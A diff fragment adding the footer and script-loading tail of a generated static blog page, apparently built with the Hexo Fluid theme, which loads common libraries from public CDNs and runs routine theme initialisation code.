+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
